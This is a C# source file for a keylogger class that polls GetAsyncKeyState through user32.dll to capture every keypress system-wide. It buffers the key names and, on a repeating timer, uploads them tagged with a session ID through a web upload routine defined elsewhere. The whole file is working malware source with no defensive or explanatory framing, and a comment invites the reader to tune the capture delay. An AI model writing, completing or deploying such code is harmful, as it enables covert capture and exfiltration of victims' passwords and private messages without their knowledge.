using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


class logger
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    public static void get_keys()
    {
        foreach (int key in defs.key_codes)
        {
            if ((GetAsyncKeyState(key) & 0x8000) != 0)
            {
                config.keys.Add(defs.key_names[key]);

                Thread.Sleep(100); // adjust the delay to your own preference
            }
        }

    }

    public static void upload_keys()
    {
        string buffer = string.Empty;

        foreach (string ch in config.keys)
        {
            if (ch.Length == 1)
            {
                buffer += ch + "";
            }
            else
            {
                buffer += ch + " , ";
            }
        }

        if (config.keys.Count > 0)
        {
            Task.Run(() => { web.upload_text($"[{config.sessionID}] New keys: " + buffer); });
            Console.WriteLine($"[{config.sessionID}] New keys: " + buffer);
        }
        else
        {
            //Task.Run(() => { web.upload_text($"[{config.sessionID}] No new keys."); });
            Console.WriteLine($"[{config.sessionID}] No new keys.");
        }
        config.keys.Clear();
    }

    public static void init()
    {
        Task.Run(async () => {         
            while (true)
            {
                await Task.Delay(config.delay);
                upload_keys();

            }
        });

        while (true)
        {
            get_keys();
        }



    }
}

